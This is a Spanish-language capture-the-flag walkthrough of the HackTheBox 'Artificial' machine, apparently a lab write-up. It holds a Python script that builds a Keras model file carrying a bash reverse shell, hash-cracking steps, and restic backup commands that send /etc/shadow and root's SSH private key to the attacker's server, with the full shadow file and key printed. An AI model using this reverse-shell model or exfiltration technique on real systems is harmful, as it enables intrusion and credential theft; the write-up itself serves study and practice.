---
hidden: true
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Artificial HackTheBox (Easy)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-17 03:56 EDT
Nmap scan report for 10.10.11.74
Host is up (0.032s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://artificial.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.98 seconds
```

Veremos varias cosas interesantes, si entramos por el puerto `80` veremos que nos redirige a un dominio llamado `artificial.htb`, por lo que vamos añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>            artificial.htb
```

Lo guardamos y volvemos a entrar pero con dicho dominio de esta forma:

```
URL = http://artificial.htb/
```

Entrando dentro veremos una pagina normal, nada fuera de lo normal, por lo que vamos a realizar un poco de `fuzzing` a ver que vemos.

Si nos vamos a `Login` veremos que nos podremos `loguear` con un usuario, pero no tenemos nada registrado, por eso le daremos al link de abajo donde podremos crear una cuenta, meteremos la informacion correspondiente para nuestra cuenta y una vez registrados iniciaremos sesion con dichas credenciales, echo esto veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-17 100233.png" alt=""><figcaption></figcaption></figure>

Vamos a descargarnos el `requirements` y el `Dockerfile` para ver como esta funcionando por dentro, ya que te estan dando los archivos para que sepas como funciona y eso puede ser una posible vulnerabilidad.

> requirements.txt

```
tensorflow-cpu==2.13.1
```

> Dockerfile

```
FROM python:3.8-slim WORKDIR /code RUN apt-get update && \ apt-get install -y curl && \ curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \ rm -rf /var/lib/apt/lists/* RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl ENTRYPOINT ["/bin/bash"]
```

Por lo que vemos hay varias posibles vulnerabilidades, ya que la version de `tensorflow` es antigua y tiene vulnerabilidades, ya que podemos cargar un archivo de modelo `IA` con extension `.h5` podremos crearnos un script en `python3` y que nos genere dicho archivo con una `reverse shell`.

> exploit.py

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

Antes de ejecutarlo vamos a crearnos un `enviroment` de `python3` en un `docker` tal cual como lo que pone en el `Dockerfile` que tenemos de referencia:

```shell
docker run --rm -it -v $(pwd):/app python:3.8-slim bash

# Dentro del contenedor:
apt update && apt install -y gcc python3-dev
pip install tensorflow-cpu==2.13.1 numpy==1.24.3 h5py
cd /app
python3 exploit.py
```

Esto nos habra generado un archivo `exploit.h5` el cual vamos a cargar en la pagina como si fuera un modelo de `IA` legitimo, pero con una `backdoor` que nos proporcionara una `shell`.

Vamos a ponernos a la escucha antes:

```shell
nc -lvnp <PORT>
```

Ahora si subimos el archivo a la pagina, se nos generara un modelo de `IA` en el cual apareceran `2` botones llamados `View Predictions` y `Delete`, vamos a darla al primer boton, echo esto si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 4444 ...
connect to [10.10.14.30] from (UNKNOWN) [10.10.11.74] 38344
bash: cannot set terminal process group (810): Inappropriate ioctl for device
bash: no job control in this shell
app@artificial:~/app$ whoami
whoami
app
```

Veremos que ha funcionado, por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user gael

Si investigamos bastante utilizando `linpeas.sh` para enumerar el sistema, veremos un archivo interesantes en la siguiente ruta llamado`users.db`.

```
RUTA = /home/app/app/instance/users.db
```

Si entramos a dicho archivo para enumerarlo con `sqlite3` veremos lo siguiente:

```shell
sqlite3 /home/app/app/instance/users.db
```

Vamos a ver las tablas que hay:

```sql
.tables
```

Info:

```
model  user
```

Vamos a enumerar las `2` de esta forma:

> user

```sql
SELECT * FROM user;
```

Info:

```
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
6|test@test.local|test@test.local|afdd0b4ad2ec172c586e2150770fbf9e
7|diseo|diseo@artificial.htb|875c9b3974555fa3eecee201d04398ca
8|adam|adam@adam.fr|1d7c2923c1684726dc23d2901c4d8157
9|test|test@test.mail|098f6bcd4621d373cade4e832627b4f6
10|admin|admin@admin.com|21232f297a57a5a743894a0e4a801fc3
11|fox|fox@fox.fox|2168ad5e463d9accb215edaafa31c8d9
12|anas|anas@gmail.com|76eb649c047cbecad7c36e71374bc9a5
```

> model

```sql
SELECT * FROM model;
```

Info:

```
7e3a2280-5e3b-4775-85ae-734f6d447ccb|7e3a2280-5e3b-4775-85ae-734f6d447ccb.h5|6
7a4f8323-5f16-47f1-8493-65df97fdee55|7a4f8323-5f16-47f1-8493-65df97fdee55.h5|7
ab3aa995-c874-4a29-a8dc-817b552a2c0a|ab3aa995-c874-4a29-a8dc-817b552a2c0a.h5|11
569f7a09-16a3-4a8e-a433-cd829174b757|569f7a09-16a3-4a8e-a433-cd829174b757.h5|12
```

Veremos varias cosas interesantes, entre ellas en los usuarios veremos uno que existe a nivel de sistema llamado `gael`, vamos a intentar `crackear` ese `MD5` a ver si lo conseguimos.

> hash

```
gael:c99175974b6e192936d97224638a34f8
```

Ahora vamos a utilizar `john` para intentar `crackearlo`:

```shell
john --format=raw-md5 --wordlist=<WORDLIST> hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
mattp005numbertwo (gael)     
1g 0:00:00:00 DONE (2025-09-17 07:21) 4.347g/s 24875Kp/s 24875Kc/s 24875KC/s mattpapa..mattne
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

Veremos que ha funcionado, por lo que vamos a probarlo directamente por `SSH` a ver si conseguimos entrar con dichas credenciales.

### SSH

```shell
ssh gael@<IP>
```

Metemos como contraseña `mattp005numbertwo`...

```
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed 17 Sep 2025 11:22:12 AM UTC

  System load:           0.14
  Usage of /:            75.0% of 7.53GB
  Memory usage:          36%
  Swap usage:            0%
  Processes:             243
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.74
  IPv6 address for eth0: dead:beef::250:56ff:fe94:7980


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Sep 17 11:22:16 2025 from 10.10.14.30
gael@artificial:~$ whoami
gael
```

Con esto veremos que estaremos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
25b68b1d66f97d346397752eac5ca9c2
```

## Escalate Privileges

Si hacemos `id` veremos lo siguiente:

```
uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
```

Vemos que pertenecemos a un grupo llamado `sysadm`, vamos a ver que archivos contiene dicho grupo con `find`.

```shell
find / -group sysadm 2>/dev/null
```

Info:

```
/var/backups/backrest_backup.tar.gz
```

Veremos que hay un `backup` con dicho archivo comprimido, por lo que vamos a descomprimirlo de esta forma:

```shell
tar -xf /var/backups/backrest_backup.tar.gz
```

Echo esto veremos una carpeta llamada `backrest` que contendra lo siguiente:

```
total 51092
drwxr-xr-x 5 gael gael     4096 Mar  4  2025 .
drwxr-x--- 5 gael gael     4096 Sep 17 11:29 ..
-rwxr-xr-x 1 gael gael 25690264 Feb 16  2025 backrest
drwxr-xr-x 3 gael gael     4096 Mar  3  2025 .config
-rwxr-xr-x 1 gael gael     3025 Mar  3  2025 install.sh
-rw------- 1 gael gael       64 Mar  3  2025 jwt-secret
-rw-r--r-- 1 gael gael    57344 Mar  4  2025 oplog.sqlite
-rw------- 1 gael gael        0 Mar  3  2025 oplog.sqlite.lock
-rw-r--r-- 1 gael gael    32768 Mar  4  2025 oplog.sqlite-shm
-rw-r--r-- 1 gael gael        0 Mar  4  2025 oplog.sqlite-wal
drwxr-xr-x 2 gael gael     4096 Mar  3  2025 processlogs
-rwxr-xr-x 1 gael gael 26501272 Mar  3  2025 restic
drwxr-xr-x 3 gael gael     4096 Mar  4  2025 tasklogs
```

Vemos que es el mismo archivo que esta en `/opt` pero al haberlo descomprimido con nuestro usuario gracias al grupo podremos leer todo e investigarlo todo, por lo que vamos a investigar que contiene o que archivos son interesantes.

Investigando un poco encontraremos lo siguiente:

```shell
cat .config/backrest/config.json
```

Info:

```json
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

Veremos algo interesantes y es un archivo de configuracion en `JSON` el cual hay una `password` que esta codificada en `base64` vamos a decodificarla y probar a `crackear` con `john`.

```shell
echo 'JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP' | base64 -d
```

Info:

```
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
```

> hash.bcrypt

```
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
```

Ahora probamos con `john`.

```shell
john --format=bcrypt --wordlist=<WORDLIST> hash.bcrypt
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#$%^           (?)     
1g 0:00:00:14 DONE (2025-09-17 07:46) 0.07107g/s 383.7p/s 383.7c/s 383.7C/s lightbulb..huevos
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que ha funcionado, por lo que tendremos las siguientes credenciales:

```
User: backrest_root
Pass: !@#$%^
```

Teniendo esto vamos a realizar un `portforwarding` del puerto `9898` que esta de forma local con `SSH` de esta forma:

```shell
ssh -L 9898:127.0.0.1:9898 gael@<IP>
```

Metiendo la contraseña del usuario `gael` accederemos de forma correcta, echo esto en nuestro `host` en la pagina web vamos acceder de la siguiente forma:

```
URL = http://localhost:9898/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-17 135955.png" alt=""><figcaption></figcaption></figure>

Veremos que funciona y veremos un `login` vamos a utilizar las credenciales encontradas anteriormente y veremos que funciona.

En el archivo del `backup` vemos que hay un binario llamado `restic`, si lo buscamos en `GTFObins` veremos que existe:

> sudo restic (GTFOBins)

```shell
RHOST=attacker.com
RPORT=12345
LFILE=file_or_dir_to_get
NAME=backup_name
sudo restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
```

Veremos que en la pagina en la seccion de `sudo` esta la siguiente configuracion para abusar de ello, pero no podemos ejecutar `sudo` con el binario.

Si entramos en la pagina con las credenciales que ya tenemos y creamo un `Add Repo`:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-17 145014.png" alt=""><figcaption></figcaption></figure>

Metiendo la informacion que queramos, cuando lo creemos si entramos dentro del mismo veremos una opcion llamada `Run Command`, que si le damos y hacemos `help`:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-17 145124.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-17 145204.png" alt=""><figcaption></figcaption></figure>

Veremos que esta haciendo por dentro este comando:

```shell
/opt/backrest/restic <Command> -o sftp.args=-oBatchMode=yes
```

Vamos a probar si realiza una conexion a nuestro servidor atacante metiendo el siguiente comando de prueba.

```shell
backup -r "rest:http://<IP>:6666/Shell" /etc/shadow
```

Abriremos un servidor de `python3` para ver si nos llega aunque sea:

```shell
python3 -m http.server 6666
```

Ahora si le damos a enviar nos dara un error claramente, pero si volvemos a donde tenemos nuestro servidor de `python3` veremos lo siguiente:

```
Serving HTTP on 0.0.0.0 port 6666 (http://0.0.0.0:6666/) ...
10.10.11.74 - - [17/Sep/2025 08:54:59] "HEAD /Shell/config HTTP/1.1" 200 -
10.10.11.74 - - [17/Sep/2025 08:54:59] code 404, message File not found
10.10.11.74 - - [17/Sep/2025 08:54:59] "GET /Shell/keys/ HTTP/1.1" 404 -
```

Veremos que hace el intento de entrar al repo que le especificamos, pero no lo consigue por que requiere de una herramienta que vamos a instalar ahora llamada `rest-server` para crear nuestro repo y que realice el contacto del mismo volcando el archivo que queramos que nos mande, aprovechando que se esta ejecutando como `root` y como vimos en `GTFOBins` podemos hacer eso que vimos anteriormente.

Vamos a instalar la herramienta de esta forma:

```shell
go install github.com/restic/rest-server/cmd/rest-server@latest
export PATH=$PATH:$(go env GOPATH)/bin
```

Echo esto vamos a crear nuestro repo y establecer la escucha del servidor para que funcione de la siguiente forma:

```shell
rest-server --path /opt/restic-repos --no-auth --listen :6666
```

Info:

```
Data directory: /opt/restic-repos
Authentication disabled
Append only mode disabled
Private repositories disabled
Group accessible repos disabled
start server on [::]:6666
```

Ahora vamos a instalar la utilidad de `restic` para inicializar el repositorio en dicho servidor que tenemos abierto, para que nos lleguen los `backups` a dicho servidor del repo.

```shell
snap install restic --classic
```

Una vez instalada, vamos a inicializar como dije antes el repo llamado `Shell` en mi caso, podemos poner lo que queramos.

```shell
/snap/bin/restic init -r "rest:http://<IP>:6666/Shell"
```

Metemos como contraseña la que queramos y ahora vamos a irnos a la pagina de `Backrest` en el que hicimos la redireccion de puertos y en el repo que habiamos creado en la opcion de `Run Command` vamos a poner el siguiente comando, ya que ahora si tenemos nuestro servidor a la escucha junto con nuestro repo inicializado de forma correcta.

```shell
backup -r "rest:http://<IP>:6666/Shell" /etc/shadow
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-17 153620.png" alt=""><figcaption></figcaption></figure>

Veremos que ha funcionado, por lo que vamos a listar las `snapshots` a ver si se creo de forma correcta.

```shell
/snap/bin/restic -r "rest:http://<IP>:6666/Shell" snapshots
```

Info:

```
enter password for repository: 
repository 353fd58b opened (repository version 2) successfully, password is correct
created new cache in /root/.cache/restic
ID        Time                 Host        Tags        Paths
------------------------------------------------------------------
0f45b7b6  2025-09-17 09:36:06  artificial              /etc/shadow
------------------------------------------------------------------
1 snapshots
```

Veremos que si, pero para poder leerlo tendremos que exportarlo alguna carpeta a nivel `local` en mi caso lo hare en `/tmp` de esta forma:

```shell
/snap/bin/restic -r "rest:http://<IP>:6666/Shell" restore 0f45b7b6 --include /etc/shadow --target /tmp
```

Metemos como contraseña la que establecimos anteriormente cuando iniciamos el repo...

```
enter password for repository: 
repository 353fd58b opened (repository version 2) successfully, password is correct
restoring <Snapshot 0f45b7b6 of [/etc/shadow] at 2025-09-17 13:36:06.346615885 +0000 UTC by root@artificial> to /tmp
```

Y con esto ya lo habremos exportado, para poder verlo tendremos que irnos a la estructura de carpetas con la que se ha creado, que seria la siguiente:

```shell
cat /tmp/etc/shadow
```

Info:

```
root:$6$UUrrHE6LTPdhmLil$v9nJaHljuUC0gR5HBAqVWvnDVgYoNYE6EvjIEGNykwadZ8w8gOu212j5bipzK72.nBtx/0h4z4CPki/Ac2f1i1:20015:0:99999:7:::
daemon:*:19430:0:99999:7:::
bin:*:19430:0:99999:7:::
sys:*:19430:0:99999:7:::
sync:*:19430:0:99999:7:::
games:*:19430:0:99999:7:::
man:*:19430:0:99999:7:::
lp:*:19430:0:99999:7:::
mail:*:19430:0:99999:7:::
news:*:19430:0:99999:7:::
uucp:*:19430:0:99999:7:::
proxy:*:19430:0:99999:7:::
www-data:*:19430:0:99999:7:::
backup:*:19430:0:99999:7:::
list:*:19430:0:99999:7:::
irc:*:19430:0:99999:7:::
gnats:*:19430:0:99999:7:::
nobody:*:19430:0:99999:7:::
systemd-network:*:19430:0:99999:7:::
systemd-resolve:*:19430:0:99999:7:::
systemd-timesync:*:19430:0:99999:7:::
messagebus:*:19430:0:99999:7:::
syslog:*:19430:0:99999:7:::
_apt:*:19430:0:99999:7:::
tss:*:19430:0:99999:7:::
uuidd:*:19430:0:99999:7:::
tcpdump:*:19430:0:99999:7:::
landscape:*:19430:0:99999:7:::
pollinate:*:19430:0:99999:7:::
fwupd-refresh:*:19430:0:99999:7:::
usbmux:*:19971:0:99999:7:::
sshd:*:19971:0:99999:7:::
systemd-coredump:!!:19973::::::
gael:$6$ZgkOwXDgoK.yOfv9$7gGQcVFbMepHAPCW.qS/1z87V5p15x4RokWKwNvFXqwo3QLEfFx2GaJs1JqbZ81i/uLy7bJ8TYk4dQYXQpeEC0:20015:0:99999:7:::
lxd:!:19973::::::
app:$6$1CKnP41b8QhfYnAx$b88.zZJfVQ84SBkePAyzIsXdA/w6wvUVq4c2ExOho0RIY8iS43bdJbBPHYdttqqNvBV.H6noc2EFkdBlbb5WL.:20015:0:99999:7:::
mysql:!:19975:0:99999:7:::
_laurel:!:20248::::::
```

Vemos que funciono todo de forma correcta, por lo que podremos exportar archivos, vamos a probar a exportar el archivo de la clave `PEM` del usuario `root` a ver si funciona.

```shell
backup -r "rest:http://<IP>:6666/Shell" /root/.ssh/id_rsa
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-17 154931.png" alt=""><figcaption></figcaption></figure>

Volveremos a listar nuestras `snapshots` y veremos que se paso de forma correcta la ultima.

```shell
/snap/bin/restic -r "rest:http://<IP>:6666/Shell" snapshots
```

Info:

```
enter password for repository: 
repository 353fd58b opened (repository version 2) successfully, password is correct
ID        Time                 Host        Tags        Paths
------------------------------------------------------------------------
0f45b7b6  2025-09-17 09:36:06  artificial              /etc/shadow
ef1ff6a6  2025-09-17 09:48:17  artificial              /root/.ssh/id_rsa
------------------------------------------------------------------------
2 snapshots
```

Ahora vamos a repetir lo mismo de antes para poder exportarla y leerla de forma correcta:

```shell
/snap/bin/restic -r "rest:http://<IP>:6666/Shell" restore ef1ff6a6 --include /root/.ssh/id_rsa --target /tmp
```

Info:

```
enter password for repository: 
repository 353fd58b opened (repository version 2) successfully, password is correct
restoring <Snapshot ef1ff6a6 of [/root/.ssh/id_rsa] at 2025-09-17 13:48:17.11103082 +0000 UTC by root@artificial> to /tmp
```

Ahora vamos a leerla de esta forma:

```shell
cat /tmp/root/.ssh/id_rsa
```

Info:

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Veremos que ha funcionado, vamos a probarla por `SSH` pero antes, tendremos que meterno en un archivo `id_rsa` y establecerle los permisos adecuados de esta forma:

```shell
chmod 600 id_rsa
```

Ahora nos conectaremos por `SSH`.

```shell
ssh -i id_rsa root@<IP>
```

Info:

```
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed 17 Sep 2025 01:54:34 PM UTC

  System load:           0.06
  Usage of /:            66.4% of 7.53GB
  Memory usage:          37%
  Swap usage:            0%
  Processes:             279
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.74
  IPv6 address for eth0: dead:beef::250:56ff:fe94:1f9d

  => There are 2 zombie processes.


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Sep 17 13:54:34 2025 from 10.10.14.30
root@artificial:~# whoami
root
```

Veremos que ha funcionado, por lo que leeremos la `flag` del usuario `root`.

> root.txt

```
924d14404544695a859fb93925635a16
```
